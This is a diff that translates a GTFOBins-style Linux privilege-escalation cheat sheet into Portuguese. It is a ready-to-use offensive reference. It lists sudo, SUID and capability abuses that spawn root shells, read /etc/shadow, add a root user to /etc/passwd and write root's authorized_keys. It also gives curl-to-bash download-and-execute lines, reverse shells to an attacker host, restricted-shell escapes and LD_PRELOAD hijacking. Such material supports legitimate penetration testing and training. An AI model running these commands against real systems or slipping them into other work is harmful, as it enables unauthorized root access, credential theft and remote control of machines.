@@ -1,42 +1,42 @@
-# GTFOBins - Linux Privilege Escalation
+# GTFOBins - Escalação de Privilégios Linux
 
-## Table of Contents
+## Índice
 
-- [Overview](#overview)
-- [SUDO Exploits](#sudo-exploits)
-- [SUID Exploits](#suid-exploits)
-- [Capabilities Exploits](#capabilities-exploits)
-- [File Read](#file-read)
-- [File Write](#file-write)
+- [Visão Geral](#visão-geral)
+- [Exploits via SUDO](#exploits-via-sudo)
+- [Exploits via SUID](#exploits-via-suid)
+- [Exploits via Capabilities](#exploits-via-capabilities)
+- [Leitura de Arquivos](#leitura-de-arquivos)
+- [Escrita em Arquivos](#escrita-em-arquivos)
 - [Reverse Shells](#reverse-shells)
-- [Shell Escape](#shell-escape)
+- [Escape de Shell](#escape-de-shell)
 
 ---
 
-## Overview
+## Visão Geral
 
-GTFOBins is a curated list of Unix binaries that can be exploited to bypass local security restrictions. This is a quick reference for the most commonly used techniques.
+GTFOBins é uma lista curada de binários Unix que podem ser explorados para contornar restrições de segurança locais. Esta é uma referência rápida para as técnicas mais utilizadas.
 
-**Full Reference:** <https://gtfobins.github.io/>
+**Referência completa:** <https://gtfobins.github.io/>
 
-**Contexts:**
+**Contextos:**
 
-- **Sudo** - Binary can be run as root via sudo
-- **SUID** - Binary has SUID bit set
-- **Capabilities** - Binary has specific Linux capabilities
+- **Sudo** — Binário pode ser executado como root via sudo
+- **SUID** — Binário possui o bit SUID ativo
+- **Capabilities** — Binário possui capabilities Linux específicas
 
 ---
 
-## SUDO Exploits
+## Exploits via SUDO
 
-### Quick Check (One-liner)
+### Verificação Rápida (One-liner)
 
 ```shell
-# Quick SUDO/SUID/Capabilities check
+# Verificar SUDO/SUID/Capabilities rapidamente
 sudo -l 2>/dev/null && find / -perm -4000 2>/dev/null | head -20 && getcap -r / 2>/dev/null
 ```
 
-### Find Sudo Permissions
+### Listar Permissões Sudo
 
 ```shell
 sudo -l
@@ -57,19 +57,19 @@ sudo bash
 ### cp
 
 ```shell
-# Copy /etc/passwd to writable location, modify, copy back
+# Copiar /etc/passwd para local gravável, modificar e restaurar
 LFILE=/etc/passwd
 sudo cp /etc/passwd /tmp/passwd.bak
-# Edit and add user, then copy back
+# Editar e adicionar usuário, depois copiar de volta
 ```
 
 ### curl
 
 ```shell
-# Read file
+# Ler arquivo
 sudo curl file:///etc/shadow
 
-# Download and execute
+# Baixar e executar
 sudo curl http://$lhost/shell.sh | bash
 ```
 
@@ -127,7 +127,7 @@ sudo git -p help config
 ### gzip / gunzip
 
 ```shell
-# Read file
+# Ler arquivo
 sudo gzip -f /etc/shadow -t
 ```
 
@@ -176,11 +176,11 @@ reset; bash 1>&0 2>&0
 ### nmap
 
 ```shell
-# Old nmap (< 5.21)
+# nmap antigo (< 5.21)
 sudo nmap --interactive
 nmap> !sh
 
-# New nmap
+# nmap novo
 TF=$(mktemp)
 echo 'os.execute("/bin/bash")' > $TF
 sudo nmap --script=$TF
@@ -238,8 +238,8 @@ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/ba
 ### tee
 
 ```shell
-# Write to file
-echo "data" | sudo tee /root/.ssh/authorized_keys
+# Escrever em arquivo
+echo "dado" | sudo tee /root/.ssh/authorized_keys
 ```
 
 ### vim / vi
@@ -252,7 +252,7 @@ sudo vi -c ':!/bin/bash'
 ### wget
 
 ```shell
-# Write file
+# Escrever em arquivo
 TF=$(mktemp)
 chmod +x $TF
 echo -e '#!/bin/bash\n/bin/bash' > $TF
@@ -268,32 +268,32 @@ sudo zip $TF /etc/hosts -T -TT 'bash #'
 
 ---
 
-## SUID Exploits
+## Exploits via SUID
 
-### Find SUID Binaries
+### Encontrar Binários SUID
 
 ```shell
 find / -perm -4000 -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-### Common SUID Exploits
+### Exploits SUID Comuns
 
-#### SUID bash
+#### bash com SUID
 
 ```shell
 /bin/bash -p
 ```
 
-#### SUID cp
+#### cp com SUID
 
 ```shell
-# Overwrite /etc/passwd
+# Sobrescrever /etc/passwd
 LFILE=/etc/passwd
-./cp /tmp/malicious_passwd $LFILE
+./cp /tmp/passwd_malicioso $LFILE
 ```
 
-#### SUID find
+#### find com SUID
 
 ```shell
 ./find . -exec /bin/sh -p \; -quit
@@ -306,19 +306,19 @@ LFILE=/etc/passwd
 nmap> !sh
 ```
 
-#### SUID php
+#### php com SUID
 
 ```shell
 ./php -r "pcntl_exec('/bin/sh', ['-p']);"
 ```
 
-#### SUID python
+#### python com SUID
 
 ```shell
 ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
-#### vim
+#### vim com SUID
 
 ```shell
 ./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
@@ -326,25 +326,25 @@ nmap> !sh
 
 ---
 
-## Capabilities Exploits
+## Exploits via Capabilities
 
-### Find Capabilities
+### Encontrar Capabilities
 
 ```shell
 getcap -r / 2>/dev/null
 ```
 
-### Common Capability Exploits
+### Exploits Comuns por Capability
 
 #### cap_setuid
 
-> python with cap_setuid
+> python com cap_setuid
 
 ```shell
 ./python -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
-> perl with cap_setuid
+> perl com cap_setuid
 
 ```shell
 ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
@@ -352,7 +352,7 @@ getcap -r / 2>/dev/null
 
 #### cap_dac_read_search
 
-> tar with cap_dac_read_search (read any file)
+> tar com cap_dac_read_search (ler qualquer arquivo)
 
 ```shell
 ./tar cvf shadow.tar /etc/shadow
@@ -362,44 +362,44 @@ cat etc/shadow
 
 #### cap_dac_override
 
-> vim with cap_dac_override (write any file)
+> vim com cap_dac_override (escrever em qualquer arquivo)
 
 ```shell
 ./vim /etc/passwd
-# Add root user
+# Adicionar usuário root
 ```
 
 #### cap_net_raw
 
-> tcpdump with cap_net_raw
+> tcpdump com cap_net_raw
 
 ```shell
-./tcpdump -i lo -w /tmp/capture.pcap
+./tcpdump -i lo -w /tmp/captura.pcap
 ```
 
 #### cap_sys_admin
 
-> python with cap_sys_admin
+> python com cap_sys_admin
 
 ```shell
-# Mount host filesystem from container
+# Montar sistema de arquivos do host a partir de container
 ./python -c 'import os; os.system("mount /dev/sda1 /mnt; chroot /mnt /bin/bash")'
 ```
 
 ---
 
-## File Read
+## Leitura de Arquivos
 
-### Binaries for Reading Files
+### Binários para Leitura de Arquivos
 
 ```shell
-# cat alternatives
+# Alternativas ao cat
 base64 /etc/shadow | base64 -d
 xxd /etc/shadow | xxd -r
 od -An -c /etc/shadow
 hexdump -C /etc/shadow
 
-# Using sudo
+# Via sudo
 sudo awk '{print}' /etc/shadow
 sudo sed '' /etc/shadow
 sudo head /etc/shadow
@@ -414,35 +414,35 @@ sudo diff /etc/shadow /dev/null
 
 ---
 
-## File Write
+## Escrita em Arquivos
 
-### Binaries for Writing Files
+### Binários para Escrita em Arquivos
 
 ```shell
 # tee
-echo "content" | sudo tee /target/file
+echo "conteúdo" | sudo tee /arquivo/alvo
 
 # dd
-echo "content" | sudo dd of=/target/file
+echo "conteúdo" | sudo dd of=/arquivo/alvo
 
 # cp
-sudo cp /source/file /target/file
+sudo cp /arquivo/origem /arquivo/alvo
 
 # mv
-sudo mv /source/file /target/file
+sudo mv /arquivo/origem /arquivo/alvo
 ```
 
-### Add Root User to /etc/passwd
+### Adicionar Usuário Root ao /etc/passwd
 
 ```shell
-# Generate password hash
+# Gerar hash de senha
 openssl passwd -1 -salt evil password123
-# Result: $1$evil$xyz...
+# Resultado: $1$evil$xyz...
 
-# Add to /etc/passwd
+# Adicionar ao /etc/passwd
 echo 'evil:$1$evil$xyz...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
 
-# Login as evil user
+# Logar como usuário evil
 su evil
 ```
 
@@ -461,7 +461,7 @@ sudo bash -i >& /dev/tcp/$lhost/$lport 0>&1
 ```shell
 sudo nc -e /bin/bash $lhost $lport
 
-# Without -e
+# Sem -e
 sudo rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $lhost $lport > /tmp/f
 ```
 
@@ -492,94 +492,94 @@ sudo ruby -rsocket -e'f=TCPSocket.open("$lhost",$lport).to_i;exec sprintf("/bin/
 ### socat
 
 ```shell
-# Attacker (listener)
+# Atacante (listener)
 socat file:`tty`,raw,echo=0 tcp-listen:$lport
 
-# Victim
+# Vítima
 sudo socat tcp-connect:$lhost:$lport exec:/bin/bash,pty,stderr,setsid,sigint,sane
 ```
 
 ---
 
-## Shell Escape
+## Escape de Shell
 
-### Escaping Restricted Shells
+### Escapando Shells Restritos
 
 ```shell
-# Check current shell
+# Verificar shell atual
 echo $SHELL
 echo $0
 
-# Try different escapes
+# Tentar diferentes escapes
 /bin/bash
 /bin/sh
 bash -i
 sh -i
 
-# Using commands
+# Via comandos
 awk 'BEGIN {system("/bin/bash")}'
 python -c 'import pty; pty.spawn("/bin/bash")'
 perl -e 'exec "/bin/bash";'
 vi -c ':!/bin/bash'
 ```
 
-### Escaping rbash (Restricted Bash)
+### Escapando rbash (Restricted Bash)
 
 ```shell
-# Method 1: Use absolute path
+# Método 1: Usar caminho absoluto
 /bin/bash
 
-# Method 2: Via BASH_CMDS
+# Método 2: Via BASH_CMDS
 BASH_CMDS[a]=/bin/bash;a
 
-# Method 3: Via SSH
+# Método 3: Via SSH
 ssh user@localhost /bin/bash
 
-# Method 4: Via Python
+# Método 4: Via Python
 python -c 'import os; os.system("/bin/bash")'
 
-# Method 5: Via Vim
+# Método 5: Via Vim
 vim -c ':set shell=/bin/bash' -c ':shell'
 ```
 
 ---
 
-## Quick Reference
+## Referência Rápida
 
-### Most Common SUDO Escapes
+### Escapes SUDO Mais Comuns
 
-| Binary | Command |
+| Binário | Comando |
 | :--- | :--- |
 | vim | `sudo vim -c ':!/bin/bash'` |
 | find | `sudo find . -exec /bin/bash \; -quit` |
 | python | `sudo python -c 'import os; os.system("/bin/bash")'` |
-| less | `sudo less /etc/passwd` then `!/bin/bash` |
+| less | `sudo less /etc/passwd` depois `!/bin/bash` |
 | nmap | `sudo nmap --script=/tmp/shell.nse` |
 | awk | `sudo awk 'BEGIN {system("/bin/bash")}'` |
 | perl | `sudo perl -e 'exec "/bin/bash";'` |
 | env | `sudo env /bin/bash` |
 
-### Environment Variables
+### Variáveis de Ambiente
 
 ```shell
-# Override PATH for command hijacking
+# Sobrescrever PATH para sequestro de comando
 export PATH=/tmp:$PATH
 
-# LD_PRELOAD (if env_keep)
-# Compile: gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
-sudo LD_PRELOAD=/tmp/preload.so <program>
+# LD_PRELOAD (se env_keep estiver configurado)
+# Compilar: gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
+sudo LD_PRELOAD=/tmp/preload.so <programa>
 ```
 
 ---
 
-## 📚 See Also
+## 📚 Veja Também
 
-### Related Privilege Escalation
+### Escalação de Privilégios Relacionada
 
-- **[Privilege Escalation Linux](4.2.Privilege-Escalation-Linux.md)** - Complete Linux privesc methodology
-- **[Linux Command](../6.OS-Command/6.2.Linux-command.md)** - Linux enumeration and system commands
+- **[Escalação de Privilégios Linux](Privilege-Escalation-Linux.md)** — Metodologia completa de privesc no Linux
+- **[Comandos Linux](../6.OS-Command/6.2.Linux-command.md)** — Comandos de enumeração e sistema Linux
 
-### Reverse Shells & Exploitation
+### Reverse Shells e Exploração
 
-- **[Reverse Shell](../6.OS-Command/6.3.Reverse-Shell.md)** - Payload generation for SUDO/SUID abuse
-- **[Command Injection](../7.Web-Exploit/7.4.Command-Injection.md)** - Web-based command execution
+- **[Reverse Shell](../6.OS-Command/6.3.Reverse-Shell.md)** — Geração de payloads para abuso de SUDO/SUID
+- **[Injeção de Comando](../7.Web-Exploit/7.4.Command-Injection.md)** — Execução de comandos via web
